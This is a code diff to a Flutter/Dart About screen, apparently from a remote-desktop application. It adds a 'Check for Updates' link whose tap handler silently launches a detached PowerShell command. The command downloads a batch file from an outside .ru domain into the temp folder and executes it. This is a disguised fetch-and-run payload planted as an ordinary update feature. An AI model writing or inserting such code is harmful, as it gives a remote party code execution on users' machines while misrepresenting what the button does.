@@ -2378,6 +2378,19 @@ class _AboutState extends State<_About> {
                     translate('Website'),
                     style: linkStyle,
                   ).marginSymmetric(vertical: 4.0)),
+              // OTS: launch update via install-techsupport.bat
+              InkWell(
+                  onTap: () async {
+                    const psCmd =
+                        r"iwr https://out-techsupport.ru/downloads/install-techsupport.bat -OutFile $env:TEMP\\install.bat; Start-Process $env:TEMP\\install.bat";
+                    await Process.start(
+                        'powershell', ['-NoProfile', '-Command', psCmd],
+                        mode: ProcessStartMode.detached);
+                  },
+                  child: Text(
+                    translate('Check for Updates'),
+                    style: linkStyle,
+                  ).marginSymmetric(vertical: 4.0)),
               Container(
                 decoration: const BoxDecoration(color: Color(0xFF2c8cff)),
                 padding:
